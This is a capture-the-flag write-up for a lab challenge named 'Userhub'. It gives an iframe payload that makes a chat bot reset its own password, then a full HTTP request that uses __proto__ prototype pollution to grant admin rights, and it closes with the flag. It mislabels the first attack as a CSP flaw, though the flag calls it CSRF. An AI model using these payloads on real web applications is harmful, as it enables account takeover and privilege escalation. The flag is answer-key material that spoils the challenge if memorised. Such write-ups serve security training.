# Userhub

***Step 1: (Content-Security-Policy)***
The ctf has a chatbox that is vulnerable to CSP (Content-Security-Policy).
A payload to execute in that chat is this one:
`<iframe src="http://ctf.learn-it.org:39951/api/reset-password/?username=harper&newPassword=AAAA" />`

This resets the passowrd to the chat bot (replace harper with whatever bot name you have, with small letters everywhere).
After that we can login with the new password.

***Step 2: (Prototype pollution)***
We can try a proto polution in the dashboard. A request like this will work:
```python
POST /api/update-profile HTTP/1.1
Host: ctf.learn-it.org:39951
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: http://ctf.learn-it.org:39951/dashboard/
Content-Type: application/json
Content-Length: 98
Origin: http://ctf.learn-it.org:39951
Connection: keep-alive
Cookie: X-SESSION-COOKIE=dcc77dd38244e3e9874b38ecfa8b56591b421e100c00cbb1685fb176a30fcf00.cffee7af9858641d43fe4aac40afdb67153997bd980232d7926ee6350791fbea; userhub.sid=s%3AYGgQfXPCBaBcjXuEbFnkH7-iUXEUIuLk.3%2Fiix96VNXEvkCyM%2BRbBGpg7yaSq6fzNsEi%2BiAF6Wg4
Priority: u=0

{
    "firstName":"helo",
    "email":"avery@learn-it.com",
    "role":"user",
    "__proto__":{
        "isAdmin":true
    }
}
```
After that we can go to the ***/api/admin/secret*** and we will see the flag.

flag: `LearnIT{csrf_and_prototype_pollution_was_gpt_helpful?}`